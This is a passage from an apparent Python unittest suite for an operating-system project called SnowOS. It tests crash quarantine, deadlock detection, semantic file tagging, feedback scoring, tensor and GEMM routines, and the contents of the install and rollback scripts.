        """Quarantined domain must reject execution without running callable."""
        domain = self._make_domain(max_crashes=2, quarantine=60.0)
        for _ in range(2):
            domain.execute(lambda: (_ for _ in ()).throw(RuntimeError("crash")))
        called = []
        domain.execute(lambda: called.append(1))
        self.assertEqual(len(called), 0,
                         "Quarantined domain allowed execution!")

    def test_quarantine_expires_and_allows_execution(self):
        """After quarantine expires, domain must allow execution again."""
        domain = self._make_domain(max_crashes=1, window=60.0, quarantine=0.05)
        domain.execute(lambda: (_ for _ in ()).throw(RuntimeError("crash")))
        self.assertTrue(domain.is_quarantined)
        time.sleep(0.15)
        results = []
        domain.execute(lambda: results.append("recovered"))
        self.assertEqual(results, ["recovered"],
                         "Domain did not recover after quarantine expiry")

    def test_crash_count_increments_correctly(self):
        """crash_count must increment once per trapped crash."""
        domain = self._make_domain(max_crashes=100, window=60.0)
        for i in range(5):
            domain.execute(lambda: (_ for _ in ()).throw(ValueError(f"crash {i}")))
        self.assertEqual(domain.crash_count, 5)

    def test_supervisor_registers_and_lists_domains(self):
        """NJSupervisor must track all registered domains."""
        supervisor = self.NJSupervisor()
        d1 = self._make_domain()
        d2 = self._make_domain()
        supervisor.register(d1)
        supervisor.register(d2)
        self.assertIn(d1, supervisor.domains)
        self.assertIn(d2, supervisor.domains)


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 11: Deadlock Detection (RAG / Mutex)
# ══════════════════════════════════════════════════════════════════════════════
class TestDeadlockDetection(unittest.TestCase):
    """OS Engineer: DeadlockDetectingMutex must intercept circular wait chains."""

    def setUp(self):
        from performance.sync_primitives import (
            DeadlockDetectingMutex, _ResourceAllocationGraph,
            DeadlockDetectedException,
        )
        # Reset singleton for test isolation
        _ResourceAllocationGraph._instance = None
        self.DeadlockDetectingMutex = DeadlockDetectingMutex
        self.DeadlockDetectedException = DeadlockDetectedException
        self._ResourceAllocationGraph = _ResourceAllocationGraph

    def _make_mutex(self, name):
        return self.DeadlockDetectingMutex(lock_id=name)

    def test_single_mutex_acquire_and_release(self):
        """Single mutex acquire/release must work without exceptions."""
        m = self._make_mutex("single-lock")
        m.acquire()
        m.release()

    def test_context_manager_protocol(self):
        """Mutex must work as context manager (with statement)."""
        m = self._make_mutex("ctx-manager-lock")
        with m:
            pass  # Must not raise

    def test_reentrant_acquire_same_thread(self):
        """Same thread acquiring same mutex twice must not deadlock (RLock behavior)."""
        m = self._make_mutex("reentrant-lock")
        m.acquire()
        m.acquire()  # Re-entrant — must not raise
        m.release()
        m.release()

    def test_deadlock_detection_raises_on_cycle(self):
        """Acquiring locks that create a circular wait must raise DeadlockDetectedException."""
        rag = self._ResourceAllocationGraph.get()
        m1 = self._make_mutex("dl-mutex-A")
        m2 = self._make_mutex("dl-mutex-B")

        results = []
        barrier = threading.Barrier(2)

        def thread1():
            m1.acquire()
            barrier.wait()
            time.sleep(0.05)
            try:
                m2.acquire(timeout=0.5)
                results.append("t1-no-deadlock")
            except self.DeadlockDetectedException:
                results.append("t1-deadlock-caught")
            except Exception:
                results.append("t1-timeout")
            finally:
                try:
                    m1.release()
                except Exception:
                    pass

        def thread2():
            m2.acquire()
            barrier.wait()
            time.sleep(0.05)
            try:
                m1.acquire(timeout=0.5)
                results.append("t2-no-deadlock")
            except self.DeadlockDetectedException:
                results.append("t2-deadlock-caught")
            except Exception:
                results.append("t2-timeout")
            finally:
                try:
                    m2.release()
                except Exception:
                    pass

        t1 = threading.Thread(target=thread1)
        t2 = threading.Thread(target=thread2)
        t1.start()
        t2.start()
        t1.join(timeout=3.0)
        t2.join(timeout=3.0)

        self.assertTrue(
            any("deadlock-caught" in r for r in results) or
            any("timeout" in r for r in results),
            f"Deadlock not detected or timed-out. Results: {results}"
        )

    def test_lock_timeout_raises_on_contention(self):
        """Timed acquire on a held mutex must raise LockTimeoutException."""
        from performance.sync_primitives import LockTimeoutException
        m = self._make_mutex("timeout-lock")
        m.acquire()

        result = []

        def try_acquire():
            try:
                m.acquire(timeout=0.1)
                result.append("acquired")
            except LockTimeoutException:
                result.append("timeout")
            except Exception as e:
                result.append(f"other: {e}")

        t = threading.Thread(target=try_acquire)
        t.start()
        t.join(timeout=2.0)
        m.release()
        self.assertIn("timeout", result, f"LockTimeoutException not raised: {result}")


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 12: SemanticFS — File Tagging & Ghost Files
# ══════════════════════════════════════════════════════════════════════════════
class TestSemanticFS(unittest.TestCase):
    """OS Engineer: SemanticFS must correctly tag files and track cloud ghosts."""

    def setUp(self):
        from deterministic.semantic_fs import SemanticFS
        self.SemanticFS = SemanticFS

        self.tmp = tempfile.mkdtemp()
        # Create a mock Nyx agent
        self.mock_nyx = type("MockNyx", (), {
            "nyx_dir": self.tmp,
        })()
        self.fs = SemanticFS(self.mock_nyx)

    def test_initial_contexts_has_required_keys(self):
        """SemanticFS contexts must initialize with projects, tags, ghost_files keys."""
        for key in ["projects", "tags", "ghost_files"]:
            self.assertIn(key, self.fs.contexts)

    def test_tag_file_adds_to_tags_index(self):
        """tag_file must register the file under the provided tags."""
        test_path = "/tmp/test_security_module.py"
        self.fs.tag_file(test_path, ["security", "kernel"])
        self.assertIn(test_path, self.fs.contexts["tags"].get("security", []))
        self.assertIn(test_path, self.fs.contexts["tags"].get("kernel", []))

    def test_tag_file_no_duplicate_entries(self):
        """Tagging a file twice with same tag must not create duplicates."""
        test_path = "/tmp/test_no_dup.py"
        self.fs.tag_file(test_path, ["security"])
        self.fs.tag_file(test_path, ["security"])
        self.assertEqual(
            self.fs.contexts["tags"]["security"].count(test_path), 1,
            "Duplicate tag entry created!"
        )

    def test_sync_to_cloud_registers_ghost_file(self):
        """sync_to_cloud must register a ghost file entry."""
        # Create a real temp file to sync
        with tempfile.NamedTemporaryFile(delete=False) as f:
            test_file = f.name
        try:
            result = self.fs.sync_to_cloud(test_file, provider="snow-cloud")
            self.assertTrue(result)
            self.assertTrue(self.fs.is_ghost(test_file))
        finally:
            os.unlink(test_file)

    def test_sync_to_cloud_returns_false_for_missing_file(self):
        """sync_to_cloud must return False for non-existent file."""
        result = self.fs.sync_to_cloud("/non/existent/file/path.py")
        self.assertFalse(result)

    def test_is_ghost_returns_false_for_unregistered_file(self):
        """is_ghost must return False for files not in ghost_files."""
        self.assertFalse(self.fs.is_ghost("/some/untracked/file.py"))

    def test_ghost_file_metadata_includes_provider(self):
        """Ghost file entry must store cloud_provider and remote_path."""
        with tempfile.NamedTemporaryFile(delete=False) as f:
            test_file = f.name
        try:
            self.fs.sync_to_cloud(test_file, provider="s3-snowos")
            entry = self.fs.contexts["ghost_files"][test_file]
            self.assertEqual(entry["cloud_provider"], "s3-snowos")
            self.assertIn("remote_path", entry)
            self.assertIn("last_sync", entry)
        finally:
            os.unlink(test_file)

    def test_save_and_reload_persists_tags(self):
        """Tags must persist after save and reload from disk."""
        self.fs.tag_file("/tmp/grub_fix.sh", ["bootloader"])
        self.fs._save()
        # Reload
        fs2 = self.SemanticFS(self.mock_nyx)
        self.assertIn("/tmp/grub_fix.sh", fs2.contexts["tags"].get("bootloader", []))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 13: FeedbackSystem
# ══════════════════════════════════════════════════════════════════════════════
class TestFeedbackSystem(unittest.TestCase):
    """OS Engineer: FeedbackSystem must accurately track satisfaction scores."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        feedback_path = os.path.join(self.tmp, "feedback.json")
        from personality.feedback import FeedbackSystem
        self.fs = FeedbackSystem(log_path=feedback_path)

    def test_initial_score_is_one_on_empty_history(self):
        """Empty feedback history must return perfect score (1.0)."""
        score = self.fs.get_summary()
        self.assertEqual(score, 1.0)

    def test_all_good_feedback_returns_one(self):
        """All 'good' feedback must produce score of 1.0."""
        for _ in range(5):
            self.fs.submit("good")
        score = self.fs.get_summary()
        self.assertEqual(score, 1.0)

    def test_all_bad_feedback_returns_zero(self):
        """All 'bad' feedback must produce score of 0.0."""
        for _ in range(5):
            self.fs.submit("bad")
        score = self.fs.get_summary()
        self.assertEqual(score, 0.0)

    def test_mixed_feedback_score_is_correct(self):
        """Mixed feedback must produce correct ratio."""
        self.fs.submit("good")
        self.fs.submit("good")
        self.fs.submit("bad")
        score = self.fs.get_summary()
        self.assertAlmostEqual(score, 2 / 3, places=2)

    def test_submit_returns_true_on_success(self):
        """submit() must return True when logging succeeds."""
        # FeedbackSystem.submit publishes events via event bus (may fail silently)
        # Only test the return type since bus may not be available
        result = self.fs.submit("good", "Test comment")
        # Should be True or False, never raise
        self.assertIsInstance(result, bool)

    def test_score_bounded_zero_to_one(self):
        """Satisfaction score must always be in [0.0, 1.0]."""
        self.fs.submit("bad")
        self.fs.submit("good")
        score = self.fs.get_summary()
        self.assertGreaterEqual(score, 0.0)
        self.assertLessEqual(score, 1.0)

    def test_only_recent_20_entries_considered(self):
        """Score must be computed from only the last 20 feedback entries."""
        # First, flood with 25 "bad" entries
        for _ in range(25):
            self.fs.submit("bad")
        # Then 20 "good" entries — only the last 20 should count
        for _ in range(20):
            self.fs.submit("good")
        score = self.fs.get_summary()
        self.assertEqual(score, 1.0,
                         "FeedbackSystem is not limiting to last 20 entries!")


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 14: Hardware Acceleration — TensorBuffer & TPU GEMM
# ══════════════════════════════════════════════════════════════════════════════
class TestHardwareAcceleration(unittest.TestCase):
    """OS Engineer: Hardware acceleration primitives must be numerically correct."""

    def setUp(self):
        from hardware_acceleration import (
            TensorBuffer, DataType, TPUSystolicAccelerator
        )
        self.TensorBuffer = TensorBuffer
        self.DataType = DataType
        self.TPUSystolicAccelerator = TPUSystolicAccelerator

    def test_tensorbuffer_zero_initialized(self):
        """TensorBuffer without data must be zero-initialized."""
        tb = self.TensorBuffer((4, 4))
        self.assertEqual(tb.to_list(), [0.0] * 16)

    def test_tensorbuffer_size_calculated_correctly(self):
        """TensorBuffer.size must equal product of shape dimensions."""
        import math
        for shape in [(2, 3), (4, 4), (1, 8, 8), (16,)]:
            tb = self.TensorBuffer(shape)
            self.assertEqual(tb.size, math.prod(shape))

    def test_tensorbuffer_data_stored_correctly(self):
        """TensorBuffer with explicit data must return exact values."""
        data = [1.0, 2.0, 3.0, 4.0]
        tb = self.TensorBuffer((2, 2), data=data)
        self.assertEqual(tb.to_list(), data)

    def test_tensorbuffer_rejects_wrong_data_length(self):
        """TensorBuffer must raise ValueError if data length != tensor size."""
        with self.assertRaises(ValueError):
            self.TensorBuffer((2, 2), data=[1.0, 2.0])  # Only 2 values for 4-element tensor

    def test_tpu_systolic_gemm_identity_correct(self):
        """GEMM of identity matrix with itself must return identity-like result."""
        tpu = self.TPUSystolicAccelerator(array_size=4)
        n = 4
        identity = [1.0 if i == j else 0.0 for i in range(n) for j in range(n)]
        A = self.TensorBuffer((n, n), data=identity)
        B = self.TensorBuffer((n, n), data=identity)
        C = tpu.gemm(A, B)
        self.assertIsNotNone(C)
        result = C.to_list()
        # Diagonal elements must be 1.0, off-diag 0.0
        for i in range(n):
            for j in range(n):
                expected = 1.0 if i == j else 0.0
                self.assertAlmostEqual(result[i * n + j], expected, places=4,
                    msg=f"Identity GEMM wrong at [{i},{j}]: {result[i*n+j]} != {expected}")

    def test_tpu_benchmark_returns_positive_gflops(self):
        """TPU benchmark must return positive GFLOP/s value."""
        tpu = self.TPUSystolicAccelerator(array_size=4)
        gflops = tpu.benchmark(matrix_size=16)
        self.assertGreater(gflops, 0.0,
                           f"Benchmark returned non-positive GFLOPs: {gflops}")

    def test_tpu_benchmark_gflops_uses_adaptive_precision(self):
        """Small-matrix benchmark must not round to exactly 0.0 (precision issue)."""
        tpu = self.TPUSystolicAccelerator(array_size=4)
        gflops = tpu.benchmark(matrix_size=8)
        self.assertGreater(gflops, 0.0,
                           "Adaptive precision not applied — benchmark rounded to 0.0!")


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 15: Rollback Script Integrity
# ══════════════════════════════════════════════════════════════════════════════
class TestRollbackScript(unittest.TestCase):
    """OS Engineer: rollback.sh must restore all system state on failure."""

    def setUp(self):
        self.rollback_path = ROOT / "rollback.sh"
        with open(self.rollback_path) as f:
            self.content = f.read()

    def test_rollback_restores_grub_config(self):
        """Rollback must restore /etc/default/grub backup."""
        self.assertIn("grub", self.content.lower(),
                      "rollback.sh does not mention grub restoration")

    def test_rollback_handles_os_release(self):
        """Rollback must restore /etc/os-release or handle the diversion."""
        has_os_release = ("os-release" in self.content or
                          "dpkg-divert" in self.content)
        self.assertTrue(has_os_release,
                        "rollback.sh does not restore /etc/os-release")

    def test_rollback_is_executable_script(self):
        """rollback.sh must start with a valid bash shebang."""
        self.assertTrue(self.content.startswith("#!/"),
                        "rollback.sh has no shebang!")

    def test_rollback_restores_gdm_theme(self):
        """Rollback must restore GDM theme to prevent login screen crashes."""
        has_gdm = ("gdm" in self.content.lower() or
                   "gnome-shell" in self.content.lower() or
                   "gresource" in self.content.lower())
        self.assertTrue(has_gdm,
                        "rollback.sh does not mention GDM theme restoration!")


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 16: Install Script Sanity
# ══════════════════════════════════════════════════════════════════════════════
class TestInstallScript(unittest.TestCase):
    """OS Engineer: install.sh must have critical safety guarantees."""

    def setUp(self):
        self.install_path = ROOT / "install.sh"
        with open(self.install_path) as f:
            self.content = f.read()

    def test_install_requires_root(self):
        """install.sh must check for root privileges before proceeding."""
        has_root_check = ("$EUID" in self.content or
                          "$(id -u)" in self.content or
                          "whoami" in self.content)
        self.assertTrue(has_root_check,
                        "install.sh does not check for root privileges!")

    def test_install_has_set_e_pipefail(self):
        """install.sh must use set -eo pipefail or set -e for error safety."""
        has_set_e = ("set -e" in self.content or
                     "set -eo" in self.content or
                     "set -Eeo" in self.content)
        self.assertTrue(has_set_e,
                        "install.sh has no 'set -e' — silent failures possible!")

    def test_install_calls_apply_branding(self):
        """install.sh must invoke the branding/visuals scripts."""
        has_branding = ("apply_branding" in self.content or
                        "apply_snowos" in self.content)
        self.assertTrue(has_branding,
                        "install.sh does not call visual branding scripts!")


# ══════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("\n" + "═" * 78)
    print("  ❄  SnowOS Full OS Engineer Test Suite — v3.0")
    print("═" * 78 + "\n")

    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    test_modules = [
        TestFlowStateDetector,
        TestBehavioralSecurity,
        TestMemoryLogger,
        TestVectorMemory,
        TestPurePythonTfidf,
        TestPersonalityEngine,
        TestActionGating,
        TestWindowAI,
        TestGRUBConfigIntegrity,
        TestNJFaultIsolation,
        TestDeadlockDetection,
        TestSemanticFS,
        TestFeedbackSystem,
        TestHardwareAcceleration,
        TestRollbackScript,
        TestInstallScript,
    ]

    for cls in test_modules:
        suite.addTests(loader.loadTestsFromTestCase(cls))

    runner = unittest.TextTestRunner(verbosity=2, stream=sys.stdout)
    result = runner.run(suite)

    print("\n" + "═" * 78)
    total = result.testsRun
    failures = len(result.failures) + len(result.errors)
    passed = total - failures

    print(f"  {PASS}  Tests Passed : {passed}/{total}")
    if failures:
        print(f"  {FAIL}  Tests Failed : {failures}/{total}")
    print("═" * 78 + "\n")
    sys.exit(0 if result.wasSuccessful() else 1)
